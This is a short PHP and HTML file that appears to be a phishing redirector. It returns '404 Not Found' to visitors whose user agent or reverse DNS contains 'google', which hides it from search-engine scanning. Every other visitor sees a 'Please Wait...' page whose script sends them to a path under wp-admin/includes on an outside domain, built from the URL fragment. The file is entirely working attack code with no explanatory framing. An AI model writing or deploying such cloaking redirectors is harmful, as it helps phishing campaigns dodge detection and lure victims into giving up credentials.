<?php
set_time_limit(0);
error_reporting(0);

if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) {  header('HTTP/1.0 404 Not Found'); exit(); }
?>
<html> 
<head> 
    <title>Please Wait...</title> 
<script type="text/javascript">
    var hash = window.location.hash;
 var URL =  "https://withiin.com/psalms/wp-admin/includes/bab/" + hash.split('#')[1];
  window.open(URL, "_self")
 </script>

</head> 
</html>
